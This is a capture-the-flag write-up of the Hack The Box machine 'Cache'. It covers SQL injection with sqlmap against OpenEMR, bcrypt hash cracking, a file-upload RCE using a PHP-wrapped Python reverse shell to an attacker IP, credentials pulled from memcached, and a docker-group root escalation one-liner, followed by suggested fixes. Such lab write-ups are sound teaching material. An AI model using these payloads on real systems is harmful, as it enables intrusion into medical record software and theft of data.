---
layout: post
title:  "HTB: Cache Walkthrough"
categories: writeups HTB
permalink: /:categories/:title
---

{:refdef: style="text-align: center;"}
![Cache Logo](../../assets/img/writeups/htb/cache/info_card.png)
{: refdef}

Date: ?/?/2020   
Author: n0tAc0p  

Table of Contents
1. TOC 
{:toc} 

### TL;DR

`Found HMS system at hms.htb virtual host --> SQL injection to dump portal admin hash --> Shell as www-data via file upload RCE --> Used password from cache.htb site to pivot to user ash --> found user luffy password in memcached service key --> abused luffy being in the docker group to get a root shell`

### Recon and Enumeration

As always, we start with a `masscan` and an `nmap` to find out what services are running on the machine.

{:refdef: style="text-align: center;"}
![Detailed Port Scan](../../assets/img/writeups/htb/cache/detailed_port_scan.png)
{: refdef}

The only ports that are open are 22 (SSH) and 80 (HTTP).

#### Cache.htb Enumeration

Given there was no anoymous access to SSH, we focused solely on the webserver running on port 80. We ran `gobuster` with a small wordlist, then SecList's directory-list-2.3-medium. Neither list gave much information as can be seen in the picture below.

{:refdef: style="text-align: center;"}
![GoBuster Dirb Scan](../../assets/img/writeups/htb/cache/common_go_buster.png)
{: refdef}

We fired up BurpSuite and began to manually enumerate the site. The site was a FAQ on "What is a Hacker" with a few pages that can be navigated to. The only user input on the site was in the "Contact Us" and Login page. The contact us page did not make a network request on submit, so it was useless to us. Interestingly enough, the login page did not make any network requests either. We checked the source code and found a reference to a file called "functionality.js".

{:refdef: style="text-align: center;"}
![Functionality.js](../../assets/img/writeups/htb/cache/functionality_js.png)
{: refdef}

Here we find credentials for a user named `ash`. These credentials allow us to login to the site, but the only thing on the other side is an under construction banner. Moving away from the login page, I decided to go through each site page and read everything again. The about page mentioned another project by the author of the site called "HMS" or Health Management System. 

{:refdef: style="text-align: center;"}
![About page](../../assets/img/writeups/htb/cache/about_page.png)
{: refdef}

I thought the best option was to check for virtual hosts on this domain, since it specifically told us to check it out. If you are unfamiliar, virtual hosts allow for a single port to host multiple websites. 

In this case, `cache.htb` led to the site we have been enumerating, but `hms.htb` (Using the same syntax as the author) lead me to an instance of OpenEMR.

**Note: For virtual hosts to work, each name (such as hms.htb) should be added to your /etc/hosts file, where the ip is the ip of the machine**

{:refdef: style="text-align: center;"}
![OpenEMR Login](../../assets/img/writeups/htb/cache/hms_root_page.png)
{: refdef}

### Initial Foothold

I immiediately googled the service, and found out it is an open source medical record repository and patient hub. Check out the project's [GitHub Page](https://github.com/openemr/openemr){:target="blank"} for more information on the project ([1]). I found a few vulnerabilites on `ExploitDB`, but both required an authenticated user. I then stumbled upon a PDF written by [Project Insecurity](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf){:target="blank"} ([9]). I was also able to determine the version of the application was 5.0.1 (3) by visiting `hms.htb/admin.php`. I found this page by looking at the root of the project in GitHub.

{:refdef: style="text-align: center;"}
![Admin.php](../../assets/img/writeups/htb/cache/admin_page.png)
{: refdef}

#### One PDF to Rule Them All

This PDF written by Project Insecurity was extremely in depth, and a great example of a real life pentesting report. Regardless, I took a few things away from skimming it:

1. Combining a patient authentication bypass and SQL Injection allowed for an unauthenticated user to read data from the database (Page 8)
2. Once we had an authenticated user, we could upload and execute arbitrary files (and get a reverse shell) (Page 17)

I did significant enumeration of the service itself, but did not find anything out the ordinary that was not already documented on the GitHub page. Which is why I turned to the PDF.

#### SQL Injection

We followed the steps below, closely in line with what the PDF suggested:

1. Go to hms.htb/portal
2. Click on the Register Button
   1. If turned off, navigate directly to step 3
3. Go to http://hms.htb/portal/add_edit_event_user.php?eid=1
   1. If there was a "Patient Portal is turned off" error, I reset the box, or came back later
4. Set Burp Suite to intercept
5. Refresh the page so Burp Suite catches the request
6. Update the request to look like the picture below 

{:refdef: style="text-align: center;"}
![SQL Injection Request](../../assets/img/writeups/htb/cache/sql_injection_request.png)
{: refdef}

- Save the request to disk somewhere you can access it

{:refdef: style="text-align: center;"}
![Saving Burp Request](../../assets/img/writeups/htb/cache/save_burp_request.png)
{: refdef}

- Feed the request to `sqlmap` to generate a list of tables

`sqlmap -r <name-of-request-file-from-step-7> --tables`

- Use `sqlmap` to dump the `users_secure` table

`sqlmap -r <name-of-request-file-from-step-7> --dump -D openemr -T users_secure`

{:refdef: style="text-align: center;"}
![Secure Users Table](../../assets/img/writeups/htb/cache/users_secure_dump.png)
{: refdef}

Now we had a password hash for the `openemr_admin` user, it was time to crack it.

**Note: The python RCE found on Exploit DB would turn off the Patient Portal if it adjusted the global config. This made the above exploit very hard to perform. The box required multiple resets before I was able to reset the patient portal at some points. A drawback of firing exploits you do not understand at a machine. I am interested to see how others worked around this issue and if a reset was not required to contine with exploitation.**

**Note: It is possible to do this without `sqlmap`, but I was unable to find an efficient way to do it without taking hours. I am interested to see if someone came up with an efficient manual way of doing it.**

#### Hash Cracking

The hash I found was `$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0Bgfvvvvvvvhjnbb`. I went to the [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes){:target="blank"} and found a list of example hashes ([2]). I searched for "$2a0$05" and discovered it was type 3200 and "bcrypt $2*$, Blowfish (Unix)". I headed over to `hashcat` to crack the passwords, but I had absolutely 0 luck getting it to recognize the hash. Given I never use `hashcat`, I most likely had some syntax wrong. Instead I used `john` with the bcrypt format.

`john --format=bcrypt -w /usr/share/wordlists/rockyou.txt openemr_admin_hash`

**Note: You can list all formats `John` is capable of using with john --list=formats or --list=subformats**

John did not take long to return the cracked password `xxxxxx`. An interesting password, but regardless, I could now login to the admin panel!

For more information on why it was possible to bypass the patient login portal, read the PDF referenced above, In short, a debug flag toggled on turns off almost all authentication checks on the patient portal.

#### File Upload RCE

Now that I had an authenticated user, I could use the file upload remote code execution mentioned in the PDF. 

I tried a multitude of payloads before settling on a python reverse shell from [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="blank"} ([3]).

I had to use `python3` instead of just `python` because when I ran a payload with `which python`, it returned python3 and python3.6.

General Instructions for uploading and executing a payload (Must be logged in as `openemr_admin`):

1. Make a **POST** request to /portal/import_template.php
2. Set the following body parameters:
   1. docid = name of file
   2. content = payload
   3. mode = save
3. Send the request
4. Navigate to /portal/\<payload-name\> to execute payload

Here is an example of what a request could look like.

{:refdef: style="text-align: center;"}
![Payload Example](../../assets/img/writeups/htb/cache/uploading_payload.png)
{: refdef}

To get our reverse shell, I used a payload of:

~~~php
# Had to escape single quotes inside of the payload for this to work
<?php system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.201",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''); ?>
~~~

And set up a `netcat` listener on port 9001.

After navigating to "hms.htb/portal/lamp.php", I got a reverse shell back.

{:refdef: style="text-align: center;"}
![Reverse Shell](../../assets/img/writeups/htb/cache/www_data.png)
{: refdef}

I made this shell TTY so it was more usable (see my previous writeups for information on how to do this), and made my way to getting user.

### Getting User 

I checked the /home directory and found user `ash` and user `luffy` on the box. I recalled the credentials I found on the cache.htb site were for a user named ash. Trying the password for ash worked like a charm, and I had user.

To switch user, I ran `su ash` then entered that password. From there, I grabbed the user hash.

### Privilege Escalation

Given there was another user on the box, I had a feeling we would need to find a way to login as them before escalating to root.

#### Finding Memcached

I immediately tried to put `linPEAS` on the box to start enumerating with Ash. But oddly enough, I could not create files in any of Ash's home folder's (such as Documents) or even /tmp. I kept getting, "touch: cannot touch 'temp.txt': No such file or directory". It was very strange, and I am still not sure what caused the issue. Instead of working with `linPEAS` we decided to do some manual enumeration. We looked through any files that may have pertained to the user, then we used `netstat -l` to figure out what ports were listening on the box.

{:refdef: style="text-align: center;"}
![Open Listening Ports](../../assets/img/writeups/htb/cache/netstat.png)
{: refdef}

The only port that stuck out to me was 11211.

#### Memcached and User Luffy

As seen above, port 11211 was open for listening, which I have never seen before. A quick google turned up that a service called `memcached` runs on that port. To quote their website directly, `memcached` is an "in memory key value store for chunks of arbitrary data". It is meant to consolidate many small caches into one large, shared cache. See the service's [website](https://memcached.org/){:target="blank"} for more information ([4]). After some light reading on StackOverflow, I found a [post](https://stackoverflow.com/questions/19560150/get-all-keys-set-in-memcached){:target="blank"} about how to retrieve the names of all items stored in the cache ([5]). The syntax to dump item names and sizes is `stats items`. To break an item number into keys, we used `stats cachedump 1 50 (1 = slab-id, 50 = max # of keys to show)`Once I found some key names, I used the `get` command to grab the value from the key.

{:refdef: style="text-align: center;"}
![Memcached Dump](../../assets/img/writeups/htb/cache/memcached_dump.png)
{: refdef}

As I expected, there was a key with username `luffy` and password of `0n3_p1ec3`. Grabbing the password, I were able to switch over to user `luffy`.

#### Docker Group

Doing more manual enumeration without the help of `linPEAS`, I enumerated the groups that each user was a part of.

{:refdef: style="text-align: center;"}
![Luffy Groups](../../assets/img/writeups/htb/cache/group_memberships.png)
{: refdef}

I saw that user `luffy` was part of the docker group (which I haven't seen before). After some googling I found multiple articles on escalating to root with a user in the docker group. I read a post by Raj Chandel on his [blog](https://www.hackingarticles.in/docker-privilege-escalation/){:target="blank"}, then followed that up by reading the docker entry on [GTFOBins](https://gtfobins.github.io/#docker){:target="blank"} ([6, 7]). To round out my reading, I checked out a [blogpost](https://fosterelli.co/privilege-escalation-via-docker){:target="blank"} by Chris Foster which explained in depth why this was an issue ([8]).

To Summarize all these articles:

1. Docker requires root privileges to run 
2. We are able to mount docker containers to local storage, and run commands directly in those environments
3. Being in the docker group allows us to run docker commands as root

I used the following command to get a root shell (explanation of the command below it):

~~~bash
# Needed to determine which containers existed on the box that we could mount (since we could not download new ones)
docker image ls
# The only image on the box was ubuntu
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
~~~

{:refdef: style="text-align: center;"}
![Docker group priv escalation](../../assets/img/writeups/htb/cache/root_user.png)
{: refdef}

So how does this command work?

- *-v /:/mnt:* use /mnt as a storage device for the new container being created  (a bind mount according to docker)  
- *-i:* Keep standard input open  
- *-t:* allocate a psuedo TTY (-it together essentially allows for shell access to the container)  
- *--rm:* destroy container on exit  
- *chroot /mnt bash:* Changes root directory of calling process to /mnt, then executes the bash command

This is a known "issue". Docker recognizes that the docker group is dangerous, but according to Chris Foster, the entire platform would require massive overhaul to not require root privileges for everything.

### Conclusion

#### Fixes

For all fixes regarding the initial foothold (SQL Injection, file upload RCE) see the [PDF by Project Insecurity](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf){:target="blank"} ([9]). Their fixes are 100x better than anything I could recommend.  

1. Credentials for user `luffy` found in memcached  
**Either remove the credentials, encrypt them, or restrict access to the memcached service. The service is based up shared access, so using a strong encryption algorithim and storing the hash is most likely the best approach**  
2. Opened a root shell since `luffy` was in the docker group  
**Remove `luffy` from the docker group, and only put users in the group who already have root or sudo access**  

#### Final Thoughts

This box helped me brush up on my google-fu skills, as well as remembering that virtual hosts still exist. I can agree with its medium ranking, although root was straightforward. It was sad to see people nuking the box every few minutes, but that's life. Thanks to `@ASHacker` for the box's creation, and `@MrHyde` for some helpful nudges along the way. Onto the next one...

*As always, if you have any questions or feedback, please contact me on HTB! I am always looking to improve my writing to make it as clear and concise as possible (while remaining somewhat beginner friendly). Happy Hacking!*

### References

1. OpenEMR GitHub page: https://github.com/openemr/openemr
2. Hashcat Wiki Example Hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
3. Pentest monkey reverse shells: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
4. Memcached Homepage: https://memcached.org/
5. StackOverflow Memcached key dump syntax: https://stackoverflow.com/questions/19560150/get-all-keys-set-in-memcached
6. Raj Chandel's blogpost on docker group privesc: https://www.hackingarticles.in/docker-privilege-escalation/
7. GTFOBins entry on docker: https://gtfobins.github.io/#docker
8. Ryan Foster's blogpost on docker group privesc: https://fosterelli.co/privilege-escalation-via-docker
9. Project Insecurity PDF: https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf